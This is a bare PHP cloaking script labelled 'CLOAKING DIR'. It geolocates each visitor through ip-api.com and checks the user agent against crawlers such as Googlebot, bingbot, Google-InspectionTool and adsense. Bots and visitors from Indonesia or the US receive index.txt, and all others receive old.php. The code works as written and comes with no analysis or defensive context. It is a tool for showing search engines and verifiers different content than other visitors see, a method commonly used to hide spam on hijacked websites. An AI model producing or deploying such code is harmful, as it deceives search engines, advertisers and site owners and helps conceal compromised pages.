CLOAKING DIR


<?php
function getUserIP() {
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
$ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
$ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {
$ip = $_SERVER['REMOTE_ADDR'];
}
return $ip;
}

$ip = getUserIP();
$api_url = "http://ip-api.com/json/{$ip}";

$response = @file_get_contents($api_url);

if ($response === FALSE) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
curl_close($ch);
}

$data = json_decode($response, true);

$is_ipindo = false;
if ($data && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
$is_ipindo = true;
}
function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool', 'adsense', 'slurp');

foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}

return false;
}
If (is_bot() || $is_ipindo) {
echo file_get_contents('index.txt');
} else {
include('old.php');
exit;
}
?>

